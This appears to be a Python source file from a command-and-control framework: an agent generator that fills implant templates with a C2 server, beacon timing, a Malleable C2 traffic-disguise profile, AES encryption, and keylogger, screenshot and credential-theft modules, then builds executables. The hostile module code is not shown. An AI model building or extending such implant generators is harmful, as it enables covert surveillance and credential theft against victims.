"""
Agent Generator Service

Generates agents with Malleable C2 profile support.
"""

import os
import uuid
from typing import Dict, Any
from pathlib import Path

from app.services.agent_factory import AgentFactory
from app.services.agent_builder import AgentBuilder
from app.services.executable_builder import ExecutableBuilder
from app.services.communication.profiles import get_profile_info_dict


class AgentGenerator:
    """Main agent generation service."""
    
    def __init__(self):
        # Get absolute path
        current_file = Path(__file__).resolve()
        backend_dir = current_file.parent.parent.parent
        project_root = backend_dir.parent
        
        # Set directories
        self.template_dir = str(project_root / "agents" / "templates")
        self.module_dir = str(project_root / "agents" / "modules")
        self.output_dir = str(backend_dir / "generated_agents")
        
        # Ensure output directory exists
        os.makedirs(self.output_dir, exist_ok=True)

        # Initialize executable builder
        self.executable_builder = ExecutableBuilder()
        
        print(f"📂 Template directory: {self.template_dir}")
        print(f"📂 Module directory: {self.module_dir}")
        print(f"📂 Output directory: {self.output_dir}")
    
    def generate(self, config: Dict[str, Any], build_executable: bool = True) -> Dict[str, str]:
        """Generate an agent from configuration."""
        
        # Create agent using Factory
        agent = AgentFactory.create_agent(
            config["platform"],
            config["features"]
        )
        
        # Load template
        template = self._load_template(agent.get_template())
        
        # Replace placeholders
        agent_code = self._replace_placeholders(template, config, agent)
        
        # Add feature modules
        agent_code = self._add_feature_modules(agent_code, config, agent)
        
        # Generate filename with custom name support
        if config.get("custom_name"):
            filename = f"{config['custom_name']}.py"
        else:
            filename = f"agent_{config['agent_id']}.py"
        
        filepath = os.path.join(self.output_dir, filename)
        
        # Write Python source
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(agent_code)
        
        print(f"✅ Python agent generated: {filepath}")
        print(f"   Profile: {config.get('profile', 'chrome_browser')}")
        
        result = {
            "python_file": filepath,
            "executable_file": None
        }
        
        # Build executable
        if build_executable:
            print(f"🔨 Building executable...")
            exe_path = self.executable_builder.build(
                agent_filepath=filepath,
                platform=config["platform"],
                features=config["features"],
                config=config
            )
            
            if exe_path:
                result["executable_file"] = exe_path
            else:
                print("⚠️  Warning: Executable build failed, but Python file is available")
        
        return result
    
    def _load_template(self, template_path: str) -> str:
        """Load template file"""
        with open(template_path, 'r', encoding='utf-8') as f:
            return f.read()
    
    def _replace_placeholders(
        self,
        template: str,
        config: Dict[str, Any],
        agent: Any
    ) -> str:
        """Replace placeholders in template."""
        
        code = template
        
        # Basic replacements
        code = code.replace("{{C2_SERVER}}", config["c2_server"])
        code = code.replace("{{AGENT_ID}}", config["agent_id"])
        code = code.replace("{{SLEEP_INTERVAL}}", str(config["sleep_interval"]))
        code = code.replace("{{JITTER}}", str(config["jitter"]))
        code = code.replace("{{PLATFORM}}", config["platform"])
        code = code.replace("{{FEATURES}}", ", ".join(config["features"]))
        
        # ← ADDED: Profile replacement
        profile_name = config.get("profile", "chrome_browser")
        code = code.replace("{{PROFILE}}", profile_name)
        
        # ← ADDED: Profile info dict (for agent to use)
        profile_dict = get_profile_info_dict(profile_name)
        profile_code = f"""
# Malleable C2 Profile: {profile_name}
PROFILE_NAME = "{profile_name}"
PROFILE_INFO = {profile_dict}
"""
        code = code.replace("{{PROFILE_CODE}}", profile_code)
        
        # Encryption code
        if config["encryption_enabled"]:
            encryption_code = self._get_encryption_code(config["encryption_key"])
            code = code.replace("{{ENCRYPTION_CODE}}", encryption_code)
            code = code.replace("{{ENCRYPTION_BEACON}}", "# TODO: Encrypt beacon data")
            code = code.replace("{{ENCRYPTION_RESULT}}", "# TODO: Encrypt result data")
        else:
            code = code.replace("{{ENCRYPTION_CODE}}", "# Encryption disabled")
            code = code.replace("{{ENCRYPTION_BEACON}}", "")
            code = code.replace("{{ENCRYPTION_RESULT}}", "")
        
        return code
    
    def _add_feature_modules(
        self,
        code: str,
        config: Dict[str, Any],
        agent: Any
    ) -> str:
        """Add feature module code to agent."""
        
        feature_modules_code = ""
        feature_execution_code = ""
        
        for feature in config["features"]:
            # Load feature module template
            module_path = os.path.join(
                self.module_dir,
                f"{feature}_module.py.template"
            )
            
            if os.path.exists(module_path):
                with open(module_path, 'r', encoding='utf-8') as f:
                    feature_modules_code += f"\n{f.read()}\n"
                
                # Add execution code
                if feature == "keylogger":
                    feature_execution_code += """
        elif task_type == "keylog_start":
            output, error = execute_keylog_start()
        elif task_type == "keylog_stop":
            output, error = execute_keylog_stop()
        elif task_type == "keylog_dump":
            output, error = execute_keylog_dump()
"""
                elif feature == "screenshot":
                    feature_execution_code += """
        elif task_type == "screenshot":
            output, error = execute_screenshot()
"""
                elif feature == "credentials":
                    feature_execution_code += """
        elif task_type == "credentials":
            output, error = execute_credentials()
"""
        
        # Replace placeholders
        code = code.replace("{{FEATURE_MODULES}}", feature_modules_code)
        code = code.replace("{{FEATURE_EXECUTION}}", feature_execution_code)
        
        return code
    
    def _get_encryption_code(self, key: str) -> str:
        """Get encryption code for agent"""
        return f"""
# AES-256-GCM Encryption
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ENCRYPTION_KEY = base64.b64decode("{key}")
cipher = AESGCM(ENCRYPTION_KEY)

def encrypt_data(data):
    import os
    nonce = os.urandom(12)
    ciphertext = cipher.encrypt(nonce, data.encode(), None)
    return base64.b64encode(nonce + ciphertext).decode()

def decrypt_data(encrypted):
    combined = base64.b64decode(encrypted)
    nonce = combined[:12]
    ciphertext = combined[12:]
    plaintext = cipher.decrypt(nonce, ciphertext, None)
    return plaintext.decode()
"""